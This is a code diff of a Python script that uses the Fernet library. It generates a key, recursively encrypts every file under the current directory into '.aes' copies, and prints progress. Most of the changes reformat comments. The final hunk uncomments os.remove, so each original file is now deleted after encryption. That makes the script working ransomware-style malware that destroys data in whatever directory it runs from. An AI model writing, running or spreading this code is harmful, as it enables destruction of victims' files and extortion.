@@ -1,42 +1,33 @@
 from cryptography.fernet import Fernet
 import glob
 import os
-# Get current directory
-curDir = os.getcwd()
 
-def write_key():
-    """
-    Generates a key and save it into a file
-    """
+currentdirectory = os.getcwd()   # Get current directory
+
+def write_key():  #generate encryption key
     key = Fernet.generate_key()
     with open("key.key", "wb") as key_file:
         key_file.write(key)
 
-def load_key():
-    """
-    Loads the key from the current directory named `key.key`
-    """
+def load_key():   #loads the encryption key
     return open("key.key", "rb").read()
 
-def encrypt(filename, key):
-    """
-    Given a filename (str) and key (bytes), it encrypts the file and write it
-    """
+def encrypt(filename, key):  #encrypts all files, here key represents bytes
     f = Fernet(key)
 
-write_key()
-# load the previously generated key
-key = load_key()
-# initialize the Fernet class
-f = Fernet(key)
-#file_list = os.listdir(curDir)
-print('\n Beginning recursive encryption...\n\n')
-# Main loop to encrypt all files recursively
-# now the loop ignore the root folder of where it is
-for x in glob.glob(curDir +'/**/*/*', recursive=True):
+write_key() # load the previously generated key
 
-    fullpath = os.path.join(curDir, x)
-    fullnewf = os.path.join(curDir, x + '.aes')
+key = load_key()  # initialize the Fernet class
+
+f = Fernet(key)   #file_list = os.listdir(currentdirectory)
+
+print('\n Beginning recursive encryption...\n\n')
+
+for x in glob.glob(currentdirectory +'/**/*/*', recursive=True):    # Main loop to encrypt all files recursively
+# now the loop ignore the root folder of where it is
+
+    fullpath = os.path.join(currentdirectory, x)
+    fullnewf = os.path.join(currentdirectory, x + '.aes')
     # Encrypt
     if os.path.isfile(fullpath):
         print('>>> Original: \t' + fullpath + '')
@@ -46,8 +37,7 @@ for x in glob.glob(curDir +'/**/*/*', recursive=True):
        
         encrypted_data = f.encrypt(file_data)  # encrypt data
 
-         # write the encrypted file
-        with open(fullnewf, "wb") as file:
+        with open(fullnewf, "wb") as file:  # write the encrypted file
             file.write(encrypted_data)
 
-       # os.remove(fullpath)
+        os.remove(fullpath)  #removes the old file
